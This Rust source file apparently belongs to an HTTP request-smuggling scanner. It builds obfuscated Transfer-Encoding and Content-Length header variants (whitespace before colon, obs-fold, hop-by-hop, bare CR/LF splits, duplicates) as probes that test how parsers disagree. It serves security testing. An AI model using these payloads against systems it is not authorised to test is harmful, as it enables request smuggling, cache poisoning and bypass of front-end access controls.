use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BypassProbe {
    pub name: String,
    pub header_bytes: Vec<u8>,
    pub description: String,
    pub technique: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BypassResult {
    pub probe: BypassProbe,
    pub success: bool,
    pub parser_detected: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum HideTechnique {
    Space,
    Tab,
    Wrap,
    LPad,
    Hop,
    SkipHop,
    Dupe,
    Under,
    NWrap,
    RWrap,
}

impl HideTechnique {
    pub fn all() -> Vec<HideTechnique> {
        vec![
            HideTechnique::Space,
            HideTechnique::Tab,
            HideTechnique::Wrap,
            HideTechnique::LPad,
            HideTechnique::Hop,
            HideTechnique::SkipHop,
            HideTechnique::Dupe,
            HideTechnique::Under,
            HideTechnique::NWrap,
            HideTechnique::RWrap,
        ]
    }

    pub fn name(&self) -> &'static str {
        match self {
            HideTechnique::Space => "space",
            HideTechnique::Tab => "tab",
            HideTechnique::Wrap => "wrap",
            HideTechnique::LPad => "lpad",
            HideTechnique::Hop => "hop",
            HideTechnique::SkipHop => "skiphop",
            HideTechnique::Dupe => "dupe",
            HideTechnique::Under => "under",
            HideTechnique::NWrap => "nwrap",
            HideTechnique::RWrap => "rwrap",
        }
    }

    pub fn description(&self) -> &'static str {
        match self {
            HideTechnique::Space => "Space before colon in header name",
            HideTechnique::Tab => "Tab before colon in header name",
            HideTechnique::Wrap => "Header value obs-fold wrapping (CRLF+space)",
            HideTechnique::LPad => "Leading space before header name",
            HideTechnique::Hop => "Hop-by-hop via Connection header",
            HideTechnique::SkipHop => "Hop-by-hop with space in Connection value",
            HideTechnique::Dupe => "Duplicate headers (second-wins)",
            HideTechnique::Under => "Underscore replaces hyphen (CGI-style)",
            HideTechnique::NWrap => "Newline in header name (CR-only body split)",
            HideTechnique::RWrap => "Carriage return in header name (LF-only body split)",
        }
    }
}

pub fn apply_hide_technique(
    technique: &HideTechnique,
    name: &str,
    value: &str,
) -> Vec<u8> {
    match technique {
        HideTechnique::Space => {
            format!("{} : {}\r\n", name, value).into_bytes()
        }
        HideTechnique::Tab => {
            format!("{}\t: {}\r\n", name, value).into_bytes()
        }
        HideTechnique::Wrap => {
            format!("{}: \r\n {}\r\n", name, value).into_bytes()
        }
        HideTechnique::LPad => {
            format!(" {}: {}\r\n", name, value).into_bytes()
        }
        HideTechnique::Hop => {
            let mut bytes = format!("{}: {}\r\n", name, value).into_bytes();
            bytes.extend_from_slice(
                format!("Connection: {}\r\n", name).as_bytes()
            );
            bytes
        }
        HideTechnique::SkipHop => {
            let mut bytes = format!("{}: {}\r\n", name, value).into_bytes();
            bytes.extend_from_slice(
                format!("Connection: {} \r\n", name).as_bytes()
            );
            bytes
        }
        HideTechnique::Dupe => {
            format!("{}: {}\r\n{}: {}\r\n", name, value, name, value).into_bytes()
        }
        HideTechnique::Under => {
            let mangled = name.replace('-', "_");
            format!("{}: {}\r\n", mangled, value).into_bytes()
        }
        HideTechnique::NWrap => {
            format!("X-Junk: x\n{}: {}\r\n", name, value).into_bytes()
        }
        HideTechnique::RWrap => {
            format!("X-Junk: x\r{}: {}\r\n", name, value).into_bytes()
        }
    }
}

pub fn probes_for_header(name: &str, value: &str) -> Vec<BypassProbe> {
    HideTechnique::all()
        .into_iter()
        .map(|t| {
            let header_bytes = apply_hide_technique(&t, name, value);
            BypassProbe {
                name: format!("{}-{}", t.name(), name.to_lowercase()),
                header_bytes,
                description: format!("{} ({})", t.description(), name),
                technique: Some(t.name().to_string()),
            }
        })
        .collect()
}

pub fn all_bypass_probes() -> Vec<BypassProbe> {
    let mut probes = Vec::with_capacity(24);

    probes.push(BypassProbe {
        name: "standard".into(),
        header_bytes: b"Transfer-Encoding: chunked".to_vec(),
        description: "Standard TE header (no obfuscation)".into(),
        technique: None,
    });

    probes.extend(probes_for_header("Transfer-Encoding", "chunked"));

    probes.push(BypassProbe {
        name: "standard-cl".into(),
        header_bytes: b"Content-Length: 35".to_vec(),
        description: "Standard CL header (no obfuscation)".into(),
        technique: None,
    });

    probes.extend(probes_for_header("Content-Length", "35"));

    probes
}

pub fn probe_bytes_for_name(name: &str) -> Option<Vec<u8>> {
    all_bypass_probes()
        .into_iter()
        .find(|p| p.name == name)
        .map(|p| p.header_bytes)
}

pub fn probes_by_technique(technique: &HideTechnique) -> Vec<BypassProbe> {
    let tname = technique.name();
    all_bypass_probes()
        .into_iter()
        .filter(|p| p.technique.as_deref() == Some(tname))
        .collect()
}
